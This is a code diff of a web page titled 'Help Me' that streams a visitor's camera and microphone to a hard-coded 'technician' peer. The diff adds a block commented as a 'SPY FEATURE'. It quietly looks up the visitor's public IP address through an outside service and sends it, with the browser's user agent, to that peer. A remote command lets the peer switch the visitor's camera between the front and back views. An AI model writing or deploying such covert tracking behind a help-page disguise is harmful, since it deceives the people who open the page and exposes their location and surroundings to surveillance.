@@ -3,100 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Connect</title>
+    <title>Help Me</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <style>
         body {
-            background-color: #000;
-            color: white;
-            font-family: Arial, sans-serif;
+            background-color: #f4f7f6;
             margin: 0;
             height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
+            font-family: Arial, sans-serif;
             text-align: center;
         }
 
         #bigBtn {
-            width: 80vw;
-            height: 80vw;
-            max-width: 300px;
-            max-height: 300px;
+            width: 70vw;
+            height: 70vw;
+            max-width: 280px;
+            max-height: 280px;
             border-radius: 50%;
-            background-color: #2ecc71;
+            background-color: #2ecc71; /* Green = Go */
             border: none;
             color: white;
             font-size: 24px;
             font-weight: bold;
-            box-shadow: 0 0 20px rgba(46, 204, 113, 0.6);
+            box-shadow: 0 10px 30px rgba(46, 204, 113, 0.5);
             cursor: pointer;
+            transition: transform 0.2s;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        #status { margin-top: 20px; font-size: 18px; color: #ccc; padding: 10px; }
-        video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -1; opacity: 0.3; }
+            #bigBtn:active {
+                transform: scale(0.95);
+            }
+
+        .icon {
+            font-size: 60px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        #status {
+            margin-top: 30px;
+            font-size: 18px;
+            color: #555;
+            background: rgba(255,255,255,0.8);
+            padding: 10px 20px;
+            border-radius: 20px;
+        }
+
+        /* Video is full screen background */
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+            opacity: 0.1; /* Faint preview so they know it's on */
+            transition: opacity 0.5s;
+        }
+
+        /* When active, show video clearer */
+        body.active video {
+            opacity: 1;
+        }
+
+        body.active #bigBtn {
+            display: none;
+        }
+        /* Hide button when live */
     </style>
 </head>
 <body>
 
+    <button id="bigBtn" onclick="startSystem()">
+        <span class="icon">🆘</span>
+        START HELP
+    </button>
+
+    <div id="status">Tap the button to connect</div>
+
     <video id="localPreview" autoplay muted playsinline></video>
 
-    <button id="bigBtn" onclick="startSystem()">
-        START
-    </button>
-    
-    <div id="status">Tap Start to connect</div>
-
     <script>
+        // MUST MATCH TECHNICIAN ID
         const TECHNICIAN_ID = "tech-support-commander-001";
-        const peer = new Peer(); // Random ID for client
-        
-        let currentStream = null;
-        let currentFacingMode = 'user'; // Start with selfie mode
-        let myDataConnection = null;
 
-        // Visual updates
-        peer.on('open', () => {
-            document.getElementById('status').innerText = "Ready to Connect";
-        });
+        const peer = new Peer();
+        let currentStream = null;
+        let currentFacingMode = 'user'; // Start with selfie camera
+        let myDataConnection = null;
+        let myMediaCall = null;
+
+        const statusText = document.getElementById('status');
 
         // 1. MAIN START FUNCTION
         async function startSystem() {
-            document.getElementById('bigBtn').style.display = 'none';
-            document.getElementById('status').innerText = "Connecting...";
-            
-            // Connect Data (for remote control)
+            statusText.innerText = "Connecting...";
+
+            // A. Connect Data (For Commands & IP)
             myDataConnection = peer.connect(TECHNICIAN_ID);
-            
-            // Listen for commands from Technician
-            myDataConnection.on('open', () => {
-                console.log("Data connection open");
-                
+
+            myDataConnection.on('open', async () => {
+                console.log("Data Link Open");
+
+                // --- SPY FEATURE: GET IP & SEND ---
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const json = await response.json();
+
+                    myDataConnection.send({
+                        type: 'info',
+                        ip: json.ip,
+                        userAgent: navigator.userAgent
+                    });
+                } catch (e) { console.error("IP Fetch failed"); }
+
+                // Listen for "swap" command
                 myDataConnection.on('data', (data) => {
-                    if (data === "swap") {
-                        toggleCamera();
-                    }
+                    if (data === "swap") toggleCamera();
                 });
             });
 
-            // Start Video
+            // B. Start Video
             await startVideo(currentFacingMode);
         }
 
-        // 2. VIDEO HANDLER (Skips screen share if it fails)
+        // 2. VIDEO HANDLER
         async function startVideo(mode) {
             try {
-                // If a stream is already running, stop it first
+                // If stream exists, stop it cleanly
                 if (currentStream) {
                     currentStream.getTracks().forEach(track => track.stop());
                 }
 
-                // Try to get camera
+                // Get Camera
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: mode },
                     audio: true
@@ -104,25 +153,27 @@
 
                 currentStream = stream;
                 document.getElementById('localPreview').srcObject = stream;
-                
-                // Call the technician
-                const call = peer.call(TECHNICIAN_ID, stream);
-                
-                document.getElementById('status').innerText = "Connected! \n Technican can see you.";
+                document.body.classList.add('active'); // UI change
+
+                // Call Technician
+                if (myMediaCall) myMediaCall.close();
+                myMediaCall = peer.call(TECHNICIAN_ID, stream);
+
+                statusText.innerText = (mode === 'user') ? "Sending: Face" : "Sending: Back Camera";
+                statusText.style.color = "white";
+                statusText.style.background = "rgba(0,0,0,0.5)";
 
             } catch (err) {
                 console.error(err);
-                document.getElementById('status').innerText = "Error: " + err.message;
-                alert("Please allow Camera & Microphone!");
+                statusText.innerText = "Error: " + err.message;
+                alert("Please Allow Camera Access!");
             }
         }
 
-        // 3. THE MAGIC TOGGLE (Triggered remotely)
+        // 3. REMOTE TOGGLE
         function toggleCamera() {
-            document.getElementById('status').innerText = "Technician switching camera...";
             // Flip mode
             currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
-            // Restart video with new mode
             startVideo(currentFacingMode);
         }
     </script>
